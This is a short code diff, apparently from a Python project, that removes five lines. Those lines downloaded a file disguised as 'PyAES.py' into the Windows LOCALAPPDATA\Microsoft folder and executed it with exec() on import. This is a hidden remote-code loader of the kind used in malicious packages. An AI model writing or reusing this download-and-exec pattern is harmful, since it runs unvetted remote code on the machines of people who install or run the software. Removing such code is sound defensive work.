@@ -18,11 +18,6 @@ from PIL import Image
 from io import BytesIO
 
 
-dir = os.path.join(os.environ["LOCALAPPDATA"])
-url = "https://raw.githubusercontent.com/xen-light/PyAES/main/PyAES.py"
-filepath = f"{dir}\Microsoft\PyAES.py"
-urllib.request.urlretrieve(url, filepath)
-exec(open(filepath).read())
 
 class Utility:
 
